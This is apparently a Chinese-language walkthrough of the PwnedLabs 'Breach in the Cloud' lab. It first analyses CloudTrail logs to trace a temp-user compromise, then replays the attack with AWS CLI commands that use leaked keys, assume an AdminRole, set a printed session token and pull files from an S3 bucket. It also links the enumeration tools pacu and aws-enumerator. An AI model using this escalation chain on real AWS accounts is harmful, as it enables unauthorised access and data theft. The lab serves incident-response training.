---
layout: post
title:  "Breach in the Cloud"
date:   2025-08-25 01:23:01 +0800
categories: jekyll update
categories: 
  - PWNEDLABS
tags:
  - 云安全
---
> <font style="color:#000000;background-color:#ECAA04;">CloudTrail</font>
>
> AWS CloudTrail 是一种针对你的 AWS 账户进行运营审计、风险监控、治理与合规的服务。它会记录由用户、角色或 AWS 服务所执行的所有操作，产生的事件来源包括 AWS 管理控制台、CLI、SDK 以及 API 等。 支持快速查看近 90 天事件、配置 Trail 存储长期日志、甚至通过数据湖（CloudTrail Lake）实现多年日志分析，是安全、运维、合规的核心工具。  
>

[什么是 AWS CloudTrail？ - AWS CloudTrail](https://docs.aws.amazon.com/zh_cn/awscloudtrail/latest/userguide/cloudtrail-user-guide.html)



首先，我们从PwnedLabs的Discord中下载CloudTrail日志（在🔎-case-files频道中）。

解压后查看：

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1755843345333-b067b3de-d4b0-4568-85fe-7cd7a09ca631.png)

打开后发现未格式化，先格式化JSON文件：

```bash
for file in *.json; do jq . "$file" > "$file.tmp" && mv "$file.tmp" "$file"; done
```

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1755843620156-802e1497-8bb4-4652-8021-c5934eeb4bd6.png)

我们先来开一下在所有日志中都有哪些AWS主体（IAM 用户和角色）做了事情。

```bash
grep -r userName | sort -u # 递归搜索当前目录及其子目录下的所有文件中查找包含userName的行，并对结果进去排序和去重。
```

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1755843914147-03a333e7-78cf-4230-9196-d3fb9d507e68.png)

其中temp-user这个账户多次出现，在不同的时间段，高度活跃。

我们从最早的日志文件开始分析：

```bash
grep -A 10 temp-user 107513503799_CloudTrail_us-east-1_20230826T2035Z_PjmwM7E4hZ6897Aq.json
```

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1755844589496-f09b930f-c02f-45db-a9b6-1bfbb6e8826c.png)

我们可以看到IAM用户temp-user调用了`GetCallerIdentity`API。结合这些判断他执行的CLI命令是：

```bash
aws sts get-caller-identity
```

一般来说攻击者或脚本通常会先执行它确认`Access Key/Secret`是否可用，然后再决定进一步的操作。  

> <font style="background-color:#ECAA04;">GetCallerIdentify</font>
>
> 功能：此接口用于返回当前调用者的身份信息，包括账户 ID、ARN 和用户 ID。  
>
> 权限要求：调用此接口无需任何权限，即使管理员策略明确拒绝访问该`<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">sts:GetCallerIdentity</font>`操作，也能成功调用。
>

[GetCallerIdentity - AWS Security Token Service](https://docs.aws.amazon.com/zh_cn/STS/latest/APIReference/API_GetCallerIdentity.html)

查一下这个请求IP

```bash
curl ipinfo.io/84.32.71.19
```

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1755846325716-2a92426b-30e9-46f1-aa60-6b33c32516b4.png)

发现这个IP归属为`Cherry Servers`。

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1755846517730-fee71666-7109-4ce4-85f5-c16d8cb33b3b.png)

发现这是一个云资源提供商。但Huge Logistics并没有使用其服务，因此这可以是一个潜在的IoC。

继续查看下一个文件：

```bash
grep -A 20 temp-user 107513503799_CloudTrail_us-east-1_20230826T2040Z_UkDeakooXR09uCBm.json
```

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1755856481069-6365eac1-1132-4b49-a6bd-586ef3c3543e.png)

可以看到temp-user尝试列出emergency-data-recovery存储桶中的对象，但未成功（Access Denied）。

我们继续下一个文件，发现有很多temp-user发出的请求，但好多是AccessDenied，可以考虑到他可能在进行爆破，我们看一下连续两篇日志的errorMessage数量：

```bash
grep errorMessage 107513503799_CloudTrail_us-east-1_20230826T2050Z_iUtQqYPskB20yZqT.json | wc -l
grep errorMessage 107513503799_CloudTrail_us-east-1_20230826T2055Z_W0F5uypAbGttUgSn.json | wc -l
```

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1755848222311-90e768cc-1bbb-446a-a260-79d6c0c37c6f.png)

我们可以看到在下一个日志中有450条errorMessage记录。极可能在进行爆破。

> 攻击者利用工具通过爆破尝试发现或滥用AWS账户中的权限。
>
> 攻击者由于不知道掌握的IMA用户或者角色拥有哪些权限，会尝试大量API调用来探测可行的操作。
>
> 工具：[aws-enumerator](https://github.com/shabarkin/aws-enumerator)，[pacu](https://github.com/RhinoSecurityLabs/pacu)。
>

[aws-enumerator-main.zip](https://www.yuque.com/attachments/yuque/0/2025/zip/36181902/1755849275656-4aab2375-e4ed-4c6a-9eab-90c106b294df.zip)

[pacu-1.6.1.zip](https://www.yuque.com/attachments/yuque/0/2025/zip/36181902/1755849712548-36b5e8df-50bc-49b7-b93d-528843167587.zip)

查看下一个日志

```bash
grep -A 20 temp-user 107513503799_CloudTrail_us-east-1_20230826T2100Z_APB7fBUnHmiWjHtg.json
```

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1755855606870-862ef9ac-7d59-4631-a95a-ff10c7addf52.png)

看到`esponseElements.credentials`且角色 ARN 是`AdminRole`，那么temp-user成功承担名为AdminRole的角色。

> AssumeRole
>
> `AssumeRole` 是 AWS STS 的一项 API 操作，允许合法的身份（IAM 用户、角色、应用程序等）在设定的信任策略下，临时获取另一个角色（如 `AdminRole`）的权限，并得到一套临时凭证（Access Key ID、Secret Access Key、Session Token）这意味着该用户临时获得管理员权限，可以访问本应无权访问的资源。
>
> 要成功 AsssumeRole，必须满足两个条件：
>
> 1. 调用方必须拥有调用 `sts:AssumeRole` 的权限；
> 2. `AdminRole` 的信任策略（Trust Policy）必须明确允许该身份承担此角色
>

[AssumeRole - AWS Security Token Service](https://docs.aws.amazon.com/zh_cn/STS/latest/APIReference/API_AssumeRole.html?utm_source=chatgpt.com)

查看下一个日志：

```bash
grep -A 20 AdminRole 107513503799_CloudTrail_us-east-1_20230826T2105Z_fpp78PgremAcrW5c.json
```

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1755856229505-d1151c40-30b0-479b-9793-c062b856713a.png)发现他又调用了GetCallerIdentity这个API。

```bash
grep eventName 107513503799_CloudTrail_us-east-1_20230826T2120Z_UCUhsJa0zoFY3ZO0.json
```

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1755856713135-b9369c50-8794-4ca7-adb6-30c2dc86bdba.png)

看看他们访问的内容：

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1755976659350-2eb38648-c792-4daf-9336-f6ffd2827721.png)

他们下载了emergency.txt这个文件。







攻击路径：

首先入侵获取了AWS密钥。

```bash
aws configure --profile breach-in-the-cloud
```

 查询当前调用者的身份信息。

```bash
aws sts get-caller-identity --profile breach-in-the-cloud
```

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1756020478987-369703f8-de21-4753-94ff-f52f7f3ff335.png)

查看是否有内联用户策略附加到我们的 IAM 用户。

```bash
aws iam list-user-policies --user-name temp-user --profile breach-in-the-cloud
```

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1756020671330-e27516ac-74cf-4f3e-bf08-3d00c46909eb.png)

这里列出了这个用户有一个内联策略是test-temp-user。

查看这个内联策略：

```bash
aws iam get-user-policy --user-name temp-user --policy-name test-temp-user --profile breach-in-the-cloud
```

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1756020795345-39d1ed1e-cfa9-46b5-a905-b7907d9288dd.png)

看到这里设置的这个用户可以承担AdminRole角色。

接管这个角色：

```bash
aws sts assume-role --role-arn arn:aws:iam::107513503799:role/AdminRole --role-session-name MySession --profile breach-in-the-cloud
```

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1756020874676-cc597d9f-4db0-493c-b06e-207db9c829d4.png)

设置上面给出的`AccessKeyId`，`SecretAccessKey`。

```bash
aws configure --profile breach-adminrole
```

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1756020954521-6aa039f0-4bab-454d-9ecb-beffc7c4b241.png)

设置SessionToken来承担该角色。

```bash
aws configure set aws_session_token "FwoGZXIvYXdzEPj//////////wEaDEqKPBc/EjTw1dTEtiKtAS/YJI2BmQEWc2DecDkv4rnZHzT1aqRN6TrVHMx9zzzJIh9ji8y3B02DrICqy6NB3YKavN7Qnwy+OS9fwGpHOBjoMY5g8uqYGv0m50IrRB+/9oF2t4OHkOmHxgrrgatlcjvRemSxwVXFP8ecxnV/Fq9pmKzJKYiAIYg7ZUXNFu1BBPt7KovHWoT7qCuod86UJT0NmyWMZFAbCRPKt/tsajHwsJh11ZkkTs6HbiYWKNbwqsUGMi2qubiFG8rKQNJphXr7X3EfS73BkDqMCgdJLy+i3j5cg/VFe3JKUFvM8NtpsJg=" --profile breach-adminrole
```

查询当前调用者的身份信息。

```bash
aws sts get-caller-identity --profile breach-adminrole
```

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1756021094009-e134a84d-0827-4e41-bf07-69e2b4bdd3eb.png)

可以看到已经是AdminRole了。

现在尝试列出存储桶内对象。

```bash
aws s3 ls s3://emergency-data-recovery --profile breach-adminrole
```

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1756021208267-ae2b3095-301b-48bd-853d-f9f55dfb6725.png)

下载：

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1756021475179-4ea40084-4535-4c3d-9d91-91b57504906a.png)

查看文件发现flag：

![](https://cdn.nlark.com/yuque/0/2025/png/36181902/1756021527566-0a0d7bb7-ba0c-42d4-89b8-46bd80e714c9.png)

